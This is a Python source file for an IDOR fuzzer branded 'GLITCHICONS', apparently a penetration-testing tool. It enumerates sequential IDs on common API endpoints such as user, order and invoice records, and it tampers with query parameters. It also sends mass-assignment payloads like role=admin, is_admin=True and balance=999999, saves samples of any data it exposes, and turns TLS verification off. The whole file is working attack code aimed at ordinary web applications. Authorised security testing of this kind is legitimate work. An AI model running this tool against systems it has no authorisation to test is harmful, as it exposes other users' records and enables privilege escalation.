"""
GLITCHICONS ⬡ — IDOR Fuzzer v1.0
Tests: sequential IDs, ULIDs, UUIDs, parameter pollution
"""

import requests
import sys
import json
import time
import string
import random
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()

def generate_ulid():
    """Generate a random ULID-like string."""
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choices(chars, k=26))

def generate_uuids():
    """Generate test UUIDs."""
    import uuid
    return [str(uuid.uuid4()) for _ in range(5)]

def test_sequential_idor(
    base_url, param="id",
    start=1, end=20,
    cookies=None, headers=None,
    delay=0.5
):
    """Test sequential integer IDOR."""
    console.print(f"\n[bold]→ Sequential IDOR[/bold]: {base_url}")
    findings = []
    baseline = None

    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    if headers:
        session.headers.update(headers)

    for i in range(start, end + 1):
        try:
            url = f"{base_url}/{i}" if "{id}" not in base_url \
                else base_url.replace("{id}", str(i))

            r = session.get(url, timeout=10, verify=False)

            if baseline is None:
                baseline = r.status_code

            # Detect IDOR — different response = different data
            if r.status_code == 200 and len(r.text) > 100:
                console.print(
                    f"  [green]ID {i}[/green]: {r.status_code} "
                    f"({len(r.text)} bytes)"
                )
                findings.append({
                    "id"     : i,
                    "url"    : url,
                    "status" : r.status_code,
                    "length" : len(r.text),
                    "sample" : r.text[:200]
                })
            elif r.status_code == 403:
                console.print(f"  [yellow]ID {i}[/yellow]: 403 (protected)")
            elif r.status_code == 404:
                pass  # Expected — skip
            else:
                console.print(
                    f"  [dim]ID {i}[/dim]: {r.status_code}"
                )

            time.sleep(delay)

        except Exception as e:
            console.print(f"  [red]Error on ID {i}: {e}[/red]")

    return findings

def test_parameter_idor(
    base_url, params,
    test_values=None,
    cookies=None, headers=None,
    delay=0.5
):
    """Test IDOR via URL/body parameters."""
    console.print(f"\n[bold]→ Parameter IDOR[/bold]: {params}")

    if not test_values:
        test_values = list(range(1, 11)) + \
                      [generate_ulid() for _ in range(3)]

    findings = []
    session  = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    if headers:
        session.headers.update(headers)

    for val in test_values:
        try:
            test_params = params.copy()
            for k in test_params:
                test_params[k] = val

            r = session.get(
                base_url,
                params=test_params,
                timeout=10,
                verify=False
            )

            if r.status_code == 200 and len(r.text) > 50:
                console.print(
                    f"  [green]{list(params.keys())[0]}={val}[/green]: "
                    f"{r.status_code} ({len(r.text)} bytes)"
                )
                findings.append({
                    "param" : params,
                    "value" : val,
                    "status": r.status_code,
                    "length": len(r.text),
                    "sample": r.text[:200]
                })
            time.sleep(delay)

        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")

    return findings

def test_mass_assignment(
    url, method="POST",
    base_payload=None,
    extra_fields=None,
    cookies=None, headers=None
):
    """Test mass assignment vulnerability."""
    console.print(f"\n[bold]→ Mass Assignment[/bold]: {url}")

    if not base_payload:
        base_payload = {}
    if not extra_fields:
        extra_fields = {
            "role"       : "admin",
            "is_admin"   : True,
            "admin"      : 1,
            "is_verified": True,
            "balance"    : 999999,
            "credit"     : 99999,
            "vip"        : True,
            "premium"    : True,
        }

    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    if headers:
        session.headers.update(headers)

    findings = []
    for field, value in extra_fields.items():
        test_payload = base_payload.copy()
        test_payload[field] = value

        try:
            if method.upper() == "POST":
                r = session.post(
                    url, json=test_payload,
                    timeout=10, verify=False
                )
            else:
                r = session.put(
                    url, json=test_payload,
                    timeout=10, verify=False
                )

            if r.status_code in [200, 201]:
                resp_text = r.text.lower()
                if field.lower() in resp_text or \
                   str(value).lower() in resp_text:
                    console.print(
                        f"  [red]⚠ POSSIBLE: field '{field}' "
                        f"reflected in response[/red]"
                    )
                    findings.append({
                        "field"   : field,
                        "value"   : value,
                        "status"  : r.status_code,
                        "response": r.text[:300]
                    })
                else:
                    console.print(
                        f"  [dim]{field}={value}[/dim]: "
                        f"{r.status_code} (no reflection)"
                    )

        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")

    return findings

def run_idor_suite(
    target, endpoints=None,
    cookies=None, headers=None,
    output_dir=None
):
    """Run full IDOR test suite."""
    console.print(Panel(
        "[bold purple]⬡ GLITCHICONS IDOR FUZZER[/bold purple]\n"
        f"[dim]Target: {target}[/dim]",
        border_style="purple"
    ))

    all_findings = []

    if not endpoints:
        # Default common endpoints to test
        endpoints = [
            f"{target}/api/user/{{id}}",
            f"{target}/api/order/{{id}}",
            f"{target}/api/invoice/{{id}}",
            f"{target}/json/variant/{{id}}",
            f"{target}/json/product/{{id}}",
        ]

    for endpoint in endpoints:
        findings = test_sequential_idor(
            endpoint,
            cookies=cookies,
            headers=headers,
            start=1, end=20,
            delay=0.5
        )
        all_findings.extend(findings)

    # Summary
    table = Table(title="⬡ IDOR Fuzzer Results")
    table.add_column("Endpoint")
    table.add_column("Accessible IDs")
    table.add_column("Status")

    for endpoint in endpoints:
        ep_findings = [
            f for f in all_findings
            if endpoint.split("{")[0] in f.get("url", "")
        ]
        status = "[red]VULNERABLE[/red]" \
            if ep_findings else "[green]PROTECTED[/green]"
        table.add_row(
            endpoint.replace(target, ""),
            str(len(ep_findings)),
            status
        )

    console.print(table)

    # Save report
    if output_dir and all_findings:
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"idor_findings_{ts}.json"
        f.write_text(json.dumps(all_findings, indent=2))
        console.print(f"\nReport: {f}")

    return all_findings


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore")

    target = sys.argv[1] if len(sys.argv) > 1 else \
             "https://target.example.com"

    run_idor_suite(target)
